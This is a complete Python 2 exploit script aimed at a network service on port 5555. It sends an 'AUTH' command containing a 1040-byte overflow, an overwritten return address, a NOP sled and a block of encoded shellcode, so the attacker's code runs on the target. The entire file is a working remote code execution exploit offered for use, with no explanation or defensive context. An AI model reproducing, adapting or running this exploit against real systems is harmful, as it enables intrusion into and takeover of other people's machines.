#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()
shellcode = ( 
"\xda\xd6\xd9\x74\x24\xf4\x5d\x33\xc9\xba\x1c\x91\xce\x05\xb1"
"\x52\x83\xed\xfc\x31\x55\x13\x03\x49\x82\x2c\xf0\x8d\x4c\x32"
"\xfb\x6d\x8d\x53\x75\x88\xbc\x53\xe1\xd9\xef\x63\x61\x8f\x03"
"\x0f\x27\x3b\x97\x7d\xe0\x4c\x10\xcb\xd6\x63\xa1\x60\x2a\xe2"
"\x21\x7b\x7f\xc4\x18\xb4\x72\x05\x5c\xa9\x7f\x57\x35\xa5\xd2"
"\x47\x32\xf3\xee\xec\x08\x15\x77\x11\xd8\x14\x56\x84\x52\x4f"
"\x78\x27\xb6\xfb\x31\x3f\xdb\xc6\x88\xb4\x2f\xbc\x0a\x1c\x7e"
"\x3d\xa0\x61\x4e\xcc\xb8\xa6\x69\x2f\xcf\xde\x89\xd2\xc8\x25"
"\xf3\x08\x5c\xbd\x53\xda\xc6\x19\x65\x0f\x90\xea\x69\xe4\xd6"
"\xb4\x6d\xfb\x3b\xcf\x8a\x70\xba\x1f\x1b\xc2\x99\xbb\x47\x90"
"\x80\x9a\x2d\x77\xbc\xfc\x8d\x28\x18\x77\x23\x3c\x11\xda\x2c"
"\xf1\x18\xe4\xac\x9d\x2b\x97\x9e\x02\x80\x3f\x93\xcb\x0e\xb8"
"\xd4\xe1\xf7\x56\x2b\x0a\x08\x7f\xe8\x5e\x58\x17\xd9\xde\x33"
"\xe7\xe6\x0a\x93\xb7\x48\xe5\x54\x67\x29\x55\x3d\x6d\xa6\x8a"
"\x5d\x8e\x6c\xa3\xf4\x75\xe7\xc6\x03\x75\xce\xbe\x11\x75\x31"
"\x84\x9f\x93\x5b\xea\xc9\x0c\xf4\x93\x53\xc6\x65\x5b\x4e\xa3"
"\xa6\xd7\x7d\x54\x68\x10\x0b\x46\x1d\xd0\x46\x34\x88\xef\x7c"
"\x50\x56\x7d\x1b\xa0\x11\x9e\xb4\xf7\x76\x50\xcd\x9d\x6a\xcb"
"\x67\x83\x76\x8d\x40\x07\xad\x6e\x4e\x86\x20\xca\x74\x98\xfc"
"\xd3\x30\xcc\x50\x82\xee\xba\x16\x7c\x41\x14\xc1\xd3\x0b\xf0"
"\x94\x1f\x8c\x86\x98\x75\x7a\x66\x28\x20\x3b\x99\x85\xa4\xcb"
"\xe2\xfb\x54\x33\x39\xb8\x75\xd6\xeb\xb5\x1d\x4f\x7e\x74\x40"
"\x70\x55\xbb\x7d\xf3\x5f\x44\x7a\xeb\x2a\x41\xc6\xab\xc7\x3b"
"\x57\x5e\xe7\xe8\x58\x4b")

req1 = "AUTH " + "A" * 1040 + "\x71\x1d\xd1\x65" + "\x90" * 16 + shellcode

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
